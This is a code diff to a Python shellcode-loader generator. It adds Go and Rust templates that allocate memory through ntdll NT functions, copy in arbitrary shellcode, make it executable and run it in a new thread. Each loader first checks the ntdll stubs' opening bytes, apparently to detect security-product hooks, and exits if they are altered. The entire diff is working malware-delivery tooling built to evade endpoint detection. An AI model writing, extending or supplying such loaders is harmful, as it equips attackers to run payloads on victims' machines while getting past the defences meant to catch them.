@@ -192,6 +192,142 @@ NtWait(hThread, False, None)
 """
 
 
+_GO_TEMPLATE = """\
+package main
+
+import (
+\t"syscall"
+\t"unsafe"
+)
+
+{sc_bytes}
+
+func checkStub(addr uintptr) bool {{
+\tif addr == 0 {{
+\t\treturn false
+\t}}
+\tb := (*[4]byte)(unsafe.Pointer(addr))
+\treturn b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8
+}}
+
+func main() {{
+\tntdll    := syscall.NewLazyDLL("ntdll.dll")
+\tk32      := syscall.NewLazyDLL("kernel32.dll")
+\tpClose   := k32.NewProc("CloseHandle")
+\tpRtlMove := k32.NewProc("RtlMoveMemory")
+
+\tpAlloc := ntdll.NewProc("NtAllocateVirtualMemory")
+\tpProt  := ntdll.NewProc("NtProtectVirtualMemory")
+\tpThd   := ntdll.NewProc("NtCreateThreadEx")
+\tpWait  := ntdll.NewProc("NtWaitForSingleObject")
+
+\tfor _, p := range []*syscall.LazyProc{{pAlloc, pProt, pThd, pWait}} {{
+\t\tif err := p.Find(); err != nil {{ return }}
+\t\tif !checkStub(p.Addr()) {{ return }}
+\t}}
+
+\tNtAllocVM := pAlloc.Addr()
+\tNtProtVM  := pProt.Addr()
+\tNtThd     := pThd.Addr()
+\tNtWait    := pWait.Addr()
+
+\tvar mem uintptr
+\tsz := uintptr(len(sc))
+\ts, _, _ := syscall.SyscallN(NtAllocVM,
+\t\t^uintptr(0), uintptr(unsafe.Pointer(&mem)), 0,
+\t\tuintptr(unsafe.Pointer(&sz)), 0x3000, 0x04)
+\tif int32(s) < 0 || mem == 0 {{
+\t\treturn
+\t}}
+\tpRtlMove.Call(mem, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+
+\tvar old uint32
+\tsz = uintptr(len(sc))
+\ts, _, _ = syscall.SyscallN(NtProtVM,
+\t\t^uintptr(0), uintptr(unsafe.Pointer(&mem)),
+\t\tuintptr(unsafe.Pointer(&sz)), 0x20, uintptr(unsafe.Pointer(&old)))
+\tif int32(s) < 0 {{
+\t\treturn
+\t}}
+
+\tvar ht uintptr
+\ts, _, _ = syscall.SyscallN(NtThd,
+\t\tuintptr(unsafe.Pointer(&ht)), 0x1FFFFF, 0, ^uintptr(0),
+\t\tmem, 0, 0, 0, 0, 0, 0)
+\tif int32(s) < 0 || ht == 0 {{
+\t\treturn
+\t}}
+
+\tsyscall.SyscallN(NtWait, ht, 0, 0)
+\tpClose.Call(ht)
+}}
+"""
+
+_RS_TEMPLATE = """\
+#![allow(non_snake_case)]
+use std::{{mem, ptr}};
+
+type NTSTATUS = i32;
+type FnNtAllocVM        = unsafe extern "system" fn(*mut u8, *mut *mut u8, usize, *mut usize, u32, u32) -> NTSTATUS;
+type FnNtProtVM         = unsafe extern "system" fn(*mut u8, *mut *mut u8, *mut usize, u32, *mut u32) -> NTSTATUS;
+type FnNtCreateThreadEx = unsafe extern "system" fn(*mut *mut u8, u32, *mut u8, *mut u8, *mut u8, *mut u8, u32, usize, usize, usize, *mut u8) -> NTSTATUS;
+type FnNtWait           = unsafe extern "system" fn(*mut u8, i32, *mut u8) -> NTSTATUS;
+
+#[link(name = "kernel32")]
+extern "system" {{
+    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut u8;
+    fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
+    fn CloseHandle(hObject: *mut u8) -> i32;
+    fn RtlMoveMemory(dest: *mut u8, src: *const u8, len: usize);
+}}
+
+fn check_stub(addr: *mut u8) -> bool {{
+    if addr.is_null() {{ return false; }}
+    let b = unsafe {{ std::slice::from_raw_parts(addr, 4) }};
+    b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8
+}}
+
+fn main() {{
+    {sc_bytes}
+    unsafe {{
+        let ntdll = GetModuleHandleA(b"ntdll.dll\\0".as_ptr());
+        if ntdll.is_null() {{ return; }}
+
+        let fa = GetProcAddress(ntdll, b"NtAllocateVirtualMemory\\0".as_ptr());
+        let fp = GetProcAddress(ntdll, b"NtProtectVirtualMemory\\0".as_ptr());
+        let ft = GetProcAddress(ntdll, b"NtCreateThreadEx\\0".as_ptr());
+        let fw = GetProcAddress(ntdll, b"NtWaitForSingleObject\\0".as_ptr());
+        if !check_stub(fa) || !check_stub(fp) || !check_stub(ft) || !check_stub(fw) {{ return; }}
+
+        let NtAllocVM: FnNtAllocVM        = mem::transmute(fa);
+        let NtProtVM:  FnNtProtVM         = mem::transmute(fp);
+        let NtThd:     FnNtCreateThreadEx = mem::transmute(ft);
+        let NtWait:    FnNtWait           = mem::transmute(fw);
+
+        let proc = (!0usize) as *mut u8;
+        let mut p: *mut u8 = ptr::null_mut();
+        let mut sz: usize = sc.len();
+        let s = NtAllocVM(proc, &mut p, 0, &mut sz, 0x3000, 0x04);
+        if s < 0 || p.is_null() {{ return; }}
+
+        RtlMoveMemory(p, sc.as_ptr(), sc.len());
+
+        let mut old: u32 = 0;
+        let mut sz2: usize = sc.len();
+        if NtProtVM(proc, &mut p, &mut sz2, 0x20, &mut old) < 0 {{ return; }}
+
+        let mut ht: *mut u8 = ptr::null_mut();
+        let s = NtThd(&mut ht, 0x1FFFFF, ptr::null_mut(), proc,
+                      p, ptr::null_mut(), 0, 0, 0, 0, ptr::null_mut());
+        if s < 0 || ht.is_null() {{ return; }}
+
+        NtWait(ht, 0, ptr::null_mut());
+        CloseHandle(ht);
+    }}
+}}
+"""
+
+
 def generate_c(shellcode: bytes) -> str:
     """Return a C loader using NtAllocateVirtualMemory + NtCreateThreadEx via ntdll direct call."""
     return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))
@@ -200,3 +336,13 @@ def generate_c(shellcode: bytes) -> str:
 def generate_python(shellcode: bytes) -> str:
     """Return a Python ctypes loader using ntdll NT functions directly."""
     return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
+
+
+def generate_go(shellcode: bytes) -> str:
+    """Return a Go loader using NtAllocateVirtualMemory + NtCreateThreadEx with stub check."""
+    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))
+
+
+def generate_rust(shellcode: bytes) -> str:
+    """Return a Rust loader using NtAllocateVirtualMemory + NtCreateThreadEx with stub check."""
+    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
